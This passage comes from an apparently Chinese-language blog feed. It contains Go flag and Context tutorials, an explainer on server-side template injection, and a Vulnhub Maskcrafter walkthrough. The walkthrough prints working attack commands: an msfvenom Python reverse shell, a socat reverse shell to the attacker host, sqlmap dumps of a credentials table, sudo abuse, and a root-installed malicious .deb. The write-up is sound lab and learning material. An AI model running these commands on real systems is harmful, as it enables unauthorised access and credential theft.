usage <span class="token builtin">string</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">Int</span><span class="token punctuation">(</span>name <span class="token builtin">string</span><span class="token punctuation">,</span> value <span class="token builtin">int</span><span class="token punctuation">,</span> usage <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token operator">*</span><span class="token builtin">int</span><span class="token keyword">func</span> <span class="token function">Int64Var</span><span class="token punctuation">(</span>p <span class="token operator">*</span><span class="token builtin">int64</span><span class="token punctuation">,</span> name <span class="token builtin">string</span><span class="token punctuation">,</span> value <span class="token builtin">int64</span><span class="token punctuation">,</span> usage <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token keyword">func</span> <span class="token function">Int64</span><span class="token punctuation">(</span>name <span class="token builtin">string</span><span class="token punctuation">,</span> value <span class="token builtin">int64</span><span class="token punctuation">,</span> usage <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token operator">*</span><span class="token builtin">int64</span> <span class="token keyword">func</span> <span class="token function">UintVar</span><span class="token punctuation">(</span>p <span class="token operator">*</span><span class="token builtin">uint</span><span class="token punctuation">,</span> name <span class="token builtin">string</span><span class="token punctuation">,</span> value <span class="token builtin">uint</span><span class="token punctuation">,</span> usage <span class="token builtin">string</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">Uint</span><span class="token punctuation">(</span>name <span class="token builtin">string</span><span class="token punctuation">,</span> value <span class="token builtin">uint</span><span class="token punctuation">,</span> usage <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token operator">*</span><span class="token builtin">uint</span><span class="token keyword">func</span> <span class="token function">Uint64Var</span><span class="token punctuation">(</span>p <span class="token operator">*</span><span class="token builtin">uint64</span><span class="token punctuation">,</span> name <span class="token builtin">string</span><span class="token punctuation">,</span> value <span class="token builtin">uint64</span><span class="token punctuation">,</span> usage <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token keyword">func</span> <span class="token function">Uint64</span><span class="token punctuation">(</span>name <span class="token builtin">string</span><span class="token punctuation">,</span> value <span class="token builtin">uint64</span><span class="token punctuation">,</span> usage <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token operator">*</span><span class="token builtin">uint64</span><span class="token keyword">func</span> <span class="token function">Float64Var</span><span class="token punctuation">(</span>p <span class="token operator">*</span><span class="token builtin">float64</span><span class="token punctuation">,</span> name <span class="token builtin">string</span><span class="token punctuation">,</span> value <span class="token builtin">float64</span><span class="token punctuation">,</span> usage <span class="token builtin">string</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">Float64</span><span class="token punctuation">(</span>name <span class="token builtin">string</span><span class="token punctuation">,</span> value <span class="token builtin">float64</span><span class="token punctuation">,</span> usage <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token operator">*</span><span class="token builtin">float64</span><span class="token keyword">func</span> <span class="token function">StringVar</span><span class="token punctuation">(</span>p <span class="token operator">*</span><span class="token builtin">string</span><span class="token punctuation">,</span> name <span class="token builtin">string</span><span class="token punctuation">,</span> value <span class="token builtin">string</span><span class="token punctuation">,</span> usage <span class="token builtin">string</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">String</span><span class="token punctuation">(</span>name <span class="token builtin">string</span><span class="token punctuation">,</span> value <span class="token builtin">string</span><span class="token punctuation">,</span> usage <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token operator">*</span><span class="token builtin">string</span><span class="token keyword">func</span> <span class="token function">DurationVar</span><span class="token punctuation">(</span>p <span class="token operator">*</span>time<span class="token punctuation">.</span>Duration<span class="token punctuation">,</span> name <span class="token builtin">string</span><span class="token punctuation">,</span> value time<span class="token punctuation">.</span>Duration<span class="token punctuation">,</span> usage <span class="token builtin">string</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">Duration</span><span class="token punctuation">(</span>name <span class="token builtin">string</span><span class="token punctuation">,</span> value time<span class="token punctuation">.</span>Duration<span class="token punctuation">,</span> usage <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token operator">*</span>time<span class="token punctuation">.</span>Duration</code></pre></li></ul></li></ul></li></ul><p><strong>flag函数参数详解</strong></p><p>以字符串(<code>string</code>)类型举例，其它类型同理</p><ul><li><p><code>func String(name string, value string, usage string) *string</code></p><ul><li><code>name</code>：要接收的命令行参数的名称。</li><li><code>value</code>：默认值。</li><li><code>usage</code>：帮助信息。</li><li><code>*string</code>：命令行参数的值的指针。</li></ul></li><li><p><code>func StringVar(p *string, name string, value string, usage string)</code></p><ul><li><code>p</code>：用于接收命令行参数的值的指针。</li><li><code>name</code>：要接收的命令行参数的名称。</li><li><code>value</code>：默认值。</li><li><code>usage</code>：帮助信息。</li></ul></li></ul><h4 id="命令行参数格式"><a href="#命令行参数格式" class="headerlink" title="命令行参数格式"></a>命令行参数格式</h4><p><strong>支持的<code>flag</code>格式如下：</strong></p><ul><li><code>-flag</code> / <code>--flag</code></li><li><code>-flag=x</code>  / <code>--flag=x</code></li><li><code>-flag x</code>  / <code>--flag x</code>     （不能用于布尔类型）</li></ul><p><strong>几点总结：</strong></p><ul><li><code>-</code>与<code>--</code>是等价的，可以随意。</li><li>布尔类型参数不能用上面第三种格式指定参数值。</li><li>布尔类型参数的值可以用：<code>1</code>, <code>0</code>, <code>t</code>, <code>f</code>, <code>T</code>, <code>F</code>, <code>true</code>, <code>false</code>, <code>TRUE</code>, <code>FALSE</code>, <code>True</code>, <code>False</code>。</li><li>时间间隔类型(<code>time.Duration</code>)的参数值可以用：如<code>300ms</code>、<code>1.5h</code>、<code>2h45m</code>。<ul><li>合法的单位有<code>ns</code>、<code>us</code> /<code>µs</code>、<code>ms</code>、<code>s</code>、<code>m</code>、<code>h</code>。</li></ul></li></ul><h4 id="其它函数"><a href="#其它函数" class="headerlink" title="其它函数"></a>其它函数</h4><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// NArg is the number of arguments remaining after flags have been processed.</span><span class="token keyword">func</span> <span class="token function">NArg</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">int</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token function">len</span><span class="token punctuation">(</span>CommandLine<span class="token punctuation">.</span>args<span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">// Args returns the non-flag command-line arguments.即返回位置参数。</span><span class="token keyword">func</span> <span class="token function">Args</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> CommandLine<span class="token punctuation">.</span>args <span class="token punctuation">}</span><span class="token comment" spellcheck="true">// Arg returns the i'th command-line argument.</span><span class="token keyword">func</span> <span class="token function">Arg</span><span class="token punctuation">(</span>i <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> CommandLine<span class="token punctuation">.</span><span class="token function">Arg</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">// NFlag returns the number of command-line flags that have been set.</span><span class="token keyword">func</span> <span class="token function">NFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">int</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token function">len</span><span class="token punctuation">(</span>CommandLine<span class="token punctuation">.</span>actual<span class="token punctuation">)</span> <span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go Package </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Server-side template injection</title>
      <link href="2020/10/27/Server-side-template-injection/"/>
      <url>2020/10/27/Server-side-template-injection/</url>
      
        <content type="html"><![CDATA[<h2 id="一、概念定义"><a href="#一、概念定义" class="headerlink" title="一、概念定义"></a>一、概念定义</h2><h5 id="模板、模板语言、模板引擎"><a href="#模板、模板语言、模板引擎" class="headerlink" title="模板、模板语言、模板引擎"></a>模板、模板语言、模板引擎</h5><p><strong>模板</strong>即HTML文件，可以把模板看作是一个页面框架，服务器在收到HTTP Request后，使用相应的数据填充模板框架后返回给客户端。模板的作用就是达到复用的效果，例如<code>个人中心</code>页面，每个用户的该页面实际上大部分都是相同的（如菜单栏等），只有小部分不一样，因此可以把相同的部分提出来作为模板。</p><p><strong>模板语言</strong>用于在模板中小部分需要变动的地方进行占位，模板语言由模板引擎进行解析，不同的模板引擎对应的模板语言语法会存在差异。</p><p><strong>模板引擎</strong>的作用是用来解析模板中占位的模板语言，解析渲染后生成最终HTTP Response的Web 页面。</p><h5 id="Server-Side-Template-Injection"><a href="#Server-Side-Template-Injection" class="headerlink" title="Server-Side Template Injection"></a>Server-Side Template Injection</h5><p><code>SSTI</code>即服务端模板注入，该漏洞的本质也是数据与代码没有区分导致的。客户端传入的参数数据被服务器传入模板中，被模板引擎当作模板语言进行解析执行，而不是单纯的数据。</p><p> 一个<code>Twig</code> 模板引擎的例子：</p><pre class=" language-php"><code class="language-php"><span class="token variable">$output</span> <span class="token operator">=</span> <span class="token variable">$twig</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"Dear {first_name},"</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"first_name"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$user</span><span class="token punctuation">.</span>first_name<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//不存在SSTI的代码。</span><span class="token variable">$output</span> <span class="token operator">=</span> <span class="token variable">$twig</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"Dear "</span> <span class="token punctuation">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//存在SSTI的代码。</span></code></pre><h2 id="二、SSTI-Attack"><a href="#二、SSTI-Attack" class="headerlink" title="二、SSTI Attack"></a>二、SSTI Attack</h2><blockquote><p>一个SSTI攻击通常包括以下步骤：发现（Detect）—&gt; 识别（Identity）—&gt; 利用（Exploit）。</p></blockquote><h4 id="漏洞发现（Detect）"><a href="#漏洞发现（Detect）" class="headerlink" title="漏洞发现（Detect）"></a>漏洞发现（Detect）</h4><p>模板语言的语法通常会使用一些特殊字符，可以通过使用特殊字符Fuzz(<code>${\{&lt;%[%&#39;&quot;}}%\</code>)，如果系统引发了异常（ <code>exception</code>），可以看一下异常信息确定是不是输入的特殊字符引发的语法错误。SSTI会出现在两种不同情况上下文中，不同的情况利用方法也会不一样，因此需要确定其归属哪一种。</p><p><strong>Plaintext context</strong></p><p>该种上下文中，我们可以输入带有HTML标签或模板语言语法标签的数据。如：</p><ul><li><p>后端存在SSTI的模板渲染代码</p><pre class=" language-php"><code class="language-php"><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'Hello '</span> <span class="token operator">+</span> username<span class="token punctuation">)</span></code></pre></li><li><p>漏洞利用</p><ul><li><code>http://vulnerable-website.com/?username={{7*7}}</code></li></ul></li></ul><p>如果响应的页面内容为<code>Hello 49</code>则证明存在SSTI漏洞。</p><p>这种上下文的代码有时也同时存在XSS漏洞，而且很多时候SSTI会被忽略掉，认为只是简单的XSS漏洞。</p><p><strong>Code context</strong></p><p>该种上下文中，后端的代码已经给定了模板语言的语法标签，例如：</p><ul><li><p>后台存在SSTI的代码</p><pre class=" language-php"><code class="language-php">greeting <span class="token operator">=</span> <span class="token function">getQueryParameter</span><span class="token punctuation">(</span><span class="token string">'greeting'</span><span class="token punctuation">)</span>engine<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"Hello {{"</span><span class="token operator">+</span>greeting<span class="token operator">+</span><span class="token string">"}}"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span></code></pre></li><li><p>漏洞利用</p><ul><li><code>http://vulnerable-website.com/?greeting=data.username</code></li></ul></li></ul><p>这种情况下的SSTI相较于前面一种，更难被发现。</p><h4 id="模板引擎识别（Identity）"><a href="#模板引擎识别（Identity）" class="headerlink" title="模板引擎识别（Identity）"></a>模板引擎识别（Identity）</h4><p>在发现存在SSTI后，下一步就是要确定后端使用的模板引擎类型，因为模板引擎是多种多样的，而且它们的语法也不尽相同。因此确定使用哪一种模板引擎，对于利用SSTI是必要的。</p><p>一方面，我们可以通过让页面报错，通过错误信息得知使用的模板引擎。</p><p>另一方面。也可以使用一些简单的探测Payload（<code>probing payload</code>）来确定使用的模板引擎。</p><img src="/2020/10/27/Server-side-template-injection/template-decision-tree.png" alt="Template decision tree" style="zoom: 67%;"><ul><li>对于<code>{\{7*&#39;7&#39;}}</code>，<code>Jinja2</code>会得到<code>7777777</code>，而<code>Twig</code>会得到<code>49</code>。</li></ul><p><strong>参考链接</strong></p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/</a></p><p><a href="https://github.com/epinna/tplmap/" target="_blank" rel="noopener">https://github.com/epinna/tplmap/</a></p><p><a href="https://blog.csdn.net/weixin_44604541/article/details/109048578" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44604541/article/details/109048578</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
            <tag> 漏洞学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub—Maskcrafter</title>
      <link href="2020/10/26/Vulnhub%E2%80%94Maskcrafter/"/>
      <url>2020/10/26/Vulnhub%E2%80%94Maskcrafter/</url>
      
        <content type="html"><![CDATA[<h2 id="一、靶机介绍"><a href="#一、靶机介绍" class="headerlink" title="一、靶机介绍"></a>一、靶机介绍</h2><ul><li><p><strong>Name</strong>: maskcrafter: 1.1</p></li><li><p><strong>Author</strong>: <a href="https://www.vulnhub.com/author/evdaez,679/" target="_blank" rel="noopener">evdaez</a></p></li><li><p><strong>Download (Mirror)</strong>: <a href="https://download.vulnhub.com/maskcrafter/maskcrafter-1.1.ova" target="_blank" rel="noopener">https://download.vulnhub.com/maskcrafter/maskcrafter-1.1.ova</a></p></li><li><p><strong>Level</strong>: Beginners</p><ul><li>Doesn’t require bruteforcing, if you are bruteforcing, you are doing it the wrong way.</li><li>Doesn’t require advance web knowledge to get user.</li><li>Doesn’t require advance knowledge to get root too, but there is an alternative harder way.</li><li>2 ways to get user.</li><li>2 ways to get root.</li></ul></li><li><p><strong>Environment</strong></p><ul><li>DHCP-Client.</li><li>Runs on vmware workstation.</li></ul></li></ul><h2 id="二、主机信息收集"><a href="#二、主机信息收集" class="headerlink" title="二、主机信息收集"></a>二、主机信息收集</h2><h5 id="1-主机探测"><a href="#1-主机探测" class="headerlink" title="1.主机探测"></a>1.主机探测</h5><ul><li><p><code>nmap -sn -PE 192.168.90.0/24</code></p><blockquote><p>靶机采用DHCP自动获取地址，因此进行主机探测。找到靶机地址为<code>192.168.90.2</code>，Kali的IP为<code>192.168.90.3</code>。</p></blockquote></li></ul><img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026100149761.png" alt="image-20201026100149761" style="zoom: 50%;"><h5 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h5><ul><li><p><code>nmap -Pn -n -sV 192.168.90.2 -p- --min-rate=2000</code></p><blockquote><p>发现开放端口：FTP (21), SSH (22), HTTP (80), RPC (111), NFS (2049).</p></blockquote>  <img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026101252102.png" alt="image-20201026101252102" style="zoom:50%;"></li></ul><h2 id="三、FTP-Anonymous"><a href="#三、FTP-Anonymous" class="headerlink" title="三、FTP Anonymous"></a>三、FTP Anonymous</h2><p>使用<code>Nmap</code>对<code>FTP</code>服务进行漏洞扫描，发现开启了FTP匿名用户登录。</p><ul><li><p><code>nmap 192.168.90.2 --script=ftp* -p21</code></p>  <img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026103147095.png" alt="image-20201026103147095" style="zoom:50%;"></li></ul><p>使用匿名用户登录FTP服务，发现存在<code>pub</code>目录，目录下有两个文件，分别为：<code>NOTES.txt</code>、<code>cred.zip</code>，先将两个文件下载到本地。</p><blockquote><p>ftp</p><p>open 192.168.90.2</p><p>用户名：Anonymous，密码为空。</p><p>get NOTES.txt</p><p>get cred.zip</p></blockquote><img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026103607881.png" alt="image-20201026103607881" style="zoom:50%;"><p>尝试解压<code>cred.zip</code>发现被加密，需要解压密码，暂时放一边。</p><p>打开<code>NOTES.txt</code>，从中可以获得两个信息：</p><ul><li>存在<code>/debug</code>目录，且用户名为<code>admin</code>.</li><li>存在SQL注入漏洞。</li></ul><img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026104159144.png" alt="image-20201026104159144" style="zoom:50%;"><h2 id="四、Web信息收集"><a href="#四、Web信息收集" class="headerlink" title="四、Web信息收集"></a>四、Web信息收集</h2><h5 id="1-Web指纹"><a href="#1-Web指纹" class="headerlink" title="1.Web指纹"></a>1.Web指纹</h5><ul><li><p><code>whatweb http://192.168.90.2 -a 3</code></p><blockquote><p>收集到的信息， Ubuntu + Apache + PHP + <a href="mailto:&#97;&#100;&#x6d;&#x69;&#x6e;&#x40;&#99;&#111;&#118;&#x69;&#100;&#x31;&#57;&#46;&#108;&#111;&#x63;&#97;">&#97;&#100;&#x6d;&#x69;&#x6e;&#x40;&#99;&#111;&#118;&#x69;&#100;&#x31;&#57;&#46;&#108;&#111;&#x63;&#97;</a>。</p></blockquote></li></ul><img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026104808711.png" alt="image-20201026104808711" style="zoom:50%;"><h5 id="2-目录扫描"><a href="#2-目录扫描" class="headerlink" title="2.目录扫描"></a>2.目录扫描</h5><ul><li><p><code>dirb http://192.168.90.2</code></p><blockquote><p><a href="http://192.168.90.2/debug" target="_blank" rel="noopener">http://192.168.90.2/debug</a> (CODE:401|SIZE:459) </p><p><a href="http://192.168.90.2/robots.txt" target="_blank" rel="noopener">http://192.168.90.2/robots.txt</a> (CODE:200|SIZE:31)</p><p><a href="http://192.168.90.2/phpmyadmin/index.php" target="_blank" rel="noopener">http://192.168.90.2/phpmyadmin/index.php</a> (CODE:200|SIZE:10525)</p></blockquote></li></ul><h2 id="五、获取普通用户权限（两种方式）"><a href="#五、获取普通用户权限（两种方式）" class="headerlink" title="五、获取普通用户权限（两种方式）"></a>五、获取普通用户权限（两种方式）</h2><h4 id="第一种方式：弱口令-命令执行"><a href="#第一种方式：弱口令-命令执行" class="headerlink" title="第一种方式：弱口令+命令执行"></a>第一种方式：弱口令+命令执行</h4><p>访问<code>http://192.168.90.2/debug</code>，需要登录，通过前面的信息，我们知道存在<code>admin</code>用户，尝试弱口令密码也用<code>admin</code>，成功登录。</p><p>进入后台后发现存在命令执行的功能，使用<code>BurpSuite</code>抓包修改<code>command</code>参数发现可以执行任意命令。</p><img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026110404944.png" alt="image-20201026110404944" style="zoom:50%;"><p><strong>获取Shell</strong></p><p>由于是<code>www-data</code>用户，无法使用<code>bash</code>和<code>nc</code>反弹Shell，但可以使用Python反弹Shell。</p><p>先使用<code>msfvenom</code>生成Payload:</p><ul><li><code>msfvenom -p cmd/unix/reverse_python lhost=192.168.90.3 lport=4444 -f raw</code></li></ul><p>然后在Kali中开启监听：</p><ul><li><code>nc -lnvp 4444</code></li></ul><p>使用BurpSuite传入生成的Payload后，成功获取到Shell，使用Python生成交互式的Shell：</p><ul><li><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></li></ul><img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026112522083.png" alt="image-20201026112522083" style="zoom:50%;"><p><strong>获取数据库数据</strong></p><p>找到数据库连接文件<code>db.php</code>，获取数据库的用户名密码（<code>web/P@ssw0rdweb</code>）</p><img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026112930388.png" alt="image-20201026112930388" style="zoom:50%;"><p>登录数据库，在浏览<code>mydatabase</code>数据库时，发现存在<code>creds</code>数据表，联系到我们前面被加密的<code>creds.zip</code>，表中里面存放的是解压密码（<code>cred12345!!</code>）。</p><img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026113916751.png" alt="image-20201026113916751" style="zoom:50%;"><img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026114453575.png" alt="image-20201026114453575" style="zoom: 67%;"><p>使用解压密码解压得到<code>userx:thisismypasswordforuserx2020</code>，再通过查看<code>/etc/passwd</code>，猜测为用户名密码，通过SSH进行登录，成功获取到普通用户的权限。</p><img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026114942260.png" alt="image-20201026114942260" style="zoom:50%;"><img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026115101873.png" alt="image-20201026115101873" style="zoom:50%;"><h4 id="第二种方式：SQLi"><a href="#第二种方式：SQLi" class="headerlink" title="第二种方式：SQLi"></a>第二种方式：SQLi</h4><p>通过<code>NOTES.txt</code>文件给的信息可知系统存在SQL注入漏洞，对<code>/login.php</code>的登录功能进行SQL注入测试。也可以成功获取到解压密码。</p><blockquote><p><code>sqlmap -u &quot;http://192.168.90.2/login.php&quot; --forms --level 3</code></p><p><code>sqlmap -u &quot;http://192.168.90.2/login.php&quot; --forms --level 3 --dbs</code></p><p><code>sqlmap -u &quot;http://192.168.90.2/login.php&quot; --forms --level 3 -D mydatabase --tables --batch</code></p><p><code>sqlmap -u &quot;http://192.168.90.2/login.php&quot; --forms --level 3 -D mydatabase -T creds --columns --batch</code></p><p><code>sqlmap -u &quot;http://192.168.90.2/login.php&quot; --forms --level 3 -D mydatabase -T creds -C id,password --dump --batch</code></p></blockquote><h2 id="六、权限提升"><a href="#六、权限提升" class="headerlink" title="六、权限提升"></a>六、权限提升</h2><p>使用<code>userx</code>登录后，输入<code>sudo -l</code>查看可以使用<code>sudo</code>执行的命令，发现<code>userx</code>用户可以使用<code>evdaez</code>用户权限执行<code>/scripts/whatsmyid.sh</code>脚本且不需要密码。</p><img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026153933779.png" alt="image-20201026153933779" style="zoom:50%;"><p><strong>获取<code>evdaez</code>用户权限</strong></p><p>修改<code>/scripts/whatsmyid.sh</code>内容为<code>/bin/bash</code>,并使用<code>evdaez</code>用户身份执行该脚本，可以获取到<code>evdaez</code>用户权限的Shell。</p><ul><li><code>sudo -u evdaez /scripts/whatsmyid.sh</code></li></ul><img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026154541469.png" alt="image-20201026154541469" style="zoom:50%;"><p>继续执行<code>sudo -l</code>，发现<code>evdaez</code>用户可以使用<code>researcherx</code>用户的权限执行<code>socat</code>命令。</p><img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026154812666.png" alt="image-20201026154812666" style="zoom:50%;"><p><strong>获取<code>researcherx</code>用户权限</strong></p><p>使用<code>researcherx</code>用户权限执行<code>socat</code>命令，反弹交互式的Shell。在此之前，需要在Kali中开启监听：</p><ul><li>socat file:`tty`,raw,echo=0 tcp-listen:5555</li></ul><p>然后在靶机中执行命令反弹Shell：</p><ul><li><code>sudo -u researcherx socat tcp4-connect:192.168.90.3:5555 exec:/bin/sh,pty,stderr,setsid,sigint,sane</code></li></ul><p>成功获取到<code>researcherx</code>用户权限的Shell，继续执行<code>sudo -l</code>,发现可以使用任意用户权限执行<code>dpkg</code>命令。</p><img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026162024637.png" alt="image-20201026162024637" style="zoom:50%;"><p><strong>获取<code>root</code>权限</strong></p><p>首先在Kali主机中创建一个可以返回Shell的<code>.sh</code>脚本文件，然后使用<code>fpm</code>生成<code>.deb</code>包，生成的包名为<code>mydeb_1.0_all.deb</code>，然后再用python监听一个HTTP服务器，使得靶机可以下载该<code>deb</code>包。</p><blockquote><p><code>mkdir tmpdir</code></p><p><code>echo &#39;exec /bin/sh&#39; &gt; ./tmpdir/payload.sh</code></p><p><code>sudo gem install fpm &amp;&amp; fpm -n mydeb -s dir -t deb -a all --before-install tmpdir/payload.sh tmpdir</code></p><p><code>python -m SimpleHTTPServer</code></p></blockquote><p>在靶机中使用<code>wget</code>命令下载<code>deb</code>包（注意先切换到<code>/tmp</code>目录才有写入权限），然后使用<code>sudo</code>以<code>root</code>权限安装该包，成功获取<code>root</code>权限的Shell。</p><img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026165834572.png" alt="image-20201026165834572" style="zoom:50%;"><p>成功获取<code>flag</code>：</p><img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026170101890.png" alt="image-20201026170101890" style="zoom:50%;">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang学习之路—Context</title>
      <link href="2020/10/20/Golang%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94Context/"/>
      <url>2020/10/20/Golang%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94Context/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Context"><a href="#一、Context" class="headerlink" title="一、Context"></a>一、Context</h2><blockquote><p><code>Context</code>主要用来让上层<code>goroutine</code>能够随时主动结束其子<code>goroutine</code>。</p></blockquote><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> Context <span class="token keyword">interface</span> <span class="token punctuation">{</span>    <span class="token function">Deadline</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>deadline time<span class="token punctuation">.</span>Time<span class="token punctuation">,</span> ok <span class="token builtin">bool</span><span class="token punctuation">)</span>    <span class="token function">Done</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;-</span><span class="token keyword">chan</span> <span class="token keyword">struct</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token function">Err</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">error</span>    <span class="token function">Value</span><span class="token punctuation">(</span>key <span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><ul><li><code>Done()</code>方法会返回一个channel，子<code>goroutine</code>通过监听返回的channel是否有数据来判断父<code>goroutine</code>让其取消执行与否。</li><li><code>Err()</code>方法在子<code>goroutine</code>被取消执行时可以调用，会返回<code>goroutine</code>被取消执行的原因。<ul><li>当主动调用取消<code>Context</code>的函数时，返回：<code>context canceled</code>。</li><li>当计时器超时结束<code>Context</code>时，返回：<code>context deadline exceeded</code>。</li></ul></li><li><code>Deadline()</code>方法返回子<code>goroutine</code>被取消执行的具体时间，用于设置了<code>deadline</code>时(见<code>WithDeadline()</code>)，否则<code>ok==false</code>。</li></ul><h2 id="二、根Context"><a href="#二、根Context" class="headerlink" title="二、根Context"></a>二、根Context</h2><blockquote><p>Context是一个树形结构，最顶层的Context，也可以叫做根Context，Go已经在context包中为我们实现。</p><p>可以通过调用<code>context.Background()</code>和<code>context.Todo()</code>获得根Context，根Context never canceled, has no values, and has no deadline.。</p></blockquote><p>根Context实质是使用一个私有结构体<code>emptyCtx</code>，其实现了<code>Context</code>接口。</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// An emptyCtx is never canceled, has no values, and has no deadline. It is not</span><span class="token comment" spellcheck="true">// struct{}, since vars of this type must have distinct addresses.</span><span class="token keyword">type</span> emptyCtx <span class="token builtin">int</span><span class="token keyword">func</span> <span class="token punctuation">(</span><span class="token operator">*</span>emptyCtx<span class="token punctuation">)</span> <span class="token function">Deadline</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>deadline time<span class="token punctuation">.</span>Time<span class="token punctuation">,</span> ok <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span><span class="token operator">*</span>emptyCtx<span class="token punctuation">)</span> <span class="token function">Done</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;-</span><span class="token keyword">chan</span> <span class="token keyword">struct</span><span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span><span class="token operator">*</span>emptyCtx<span class="token punctuation">)</span> <span class="token function">Err</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span><span class="token operator">*</span>emptyCtx<span class="token punctuation">)</span> <span class="token function">Value</span><span class="token punctuation">(</span>key <span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token 